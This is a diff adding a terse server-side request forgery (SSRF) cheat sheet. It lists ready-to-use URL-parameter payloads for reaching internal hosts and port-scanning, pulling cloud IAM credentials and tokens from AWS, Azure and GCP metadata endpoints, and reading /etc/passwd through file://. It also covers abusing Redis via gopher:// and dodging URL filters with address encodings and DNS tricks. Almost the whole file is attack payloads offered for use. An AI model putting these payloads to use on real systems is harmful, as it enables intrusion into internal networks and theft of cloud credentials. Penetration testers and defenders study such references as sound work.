@@ -1,0 +1,30 @@
+SSRF — QUICK REF
+
+Requires: a param the server uses to fetch a URL (?url= ?uri= ?path= ?image= ?webhook= ...)
+
+1.  Confirm (catch the callback):
+    python3 -m http.server 80          # or Burp Collaborator / interactsh
+    ?url=http://<your-ip>/ssrftest
+
+2.  Internal reach:
+    ?url=http://127.0.0.1/
+    ?url=http://localhost:8080/
+    ?url=http://<internal-ip>/         # 10.x / 172.16-31.x / 192.168.x
+    ?url=http://127.0.0.1:3306/        # port scan via response diffs
+
+3.  Cloud metadata (★ creds):
+    AWS v1: ?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/<role>
+    AWS v2: PUT /latest/api/token (X-aws-ec2-metadata-token-ttl-seconds:21600) then GET w/ X-aws-ec2-metadata-token
+    Azure : ?url=http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/  (Metadata:true)
+    GCP   : ?url=http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token  (Metadata-Flavor:Google)
+
+4.  Files / schemes:
+    ?url=file:///etc/passwd
+    ?url=gopher://127.0.0.1:6379/_<redis-cmds>
+    ?url=dict://127.0.0.1:11211/stats
+
+5.  Bypasses:
+    127.0.0.1 -> 127.1 / 0.0.0.0 / [::1]
+    http://2130706433/  http://0x7f000001/
+    http://expected.com@169.254.169.254/   http://169.254.169.254#expected.com
+    169.254.169.254.nip.io   |   redirect to internal   |   DNS rebinding
